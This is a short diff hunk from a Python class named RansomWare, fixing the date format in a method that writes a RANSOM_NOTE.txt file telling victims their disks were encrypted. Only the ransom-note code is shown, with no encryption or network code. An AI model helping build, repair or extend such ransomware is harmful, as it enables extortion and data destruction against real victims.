@@ -146,7 +146,7 @@ class RansomWare:
 
 
     def ransom_note(self):
-        date = datetime.date.today().strftime('%d-%B-Y')
+        date = datetime.date.today().strftime('%d-%B-%Y')
         with open('RANSOM_NOTE.txt', 'w') as f:
             f.write(f'''
 The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
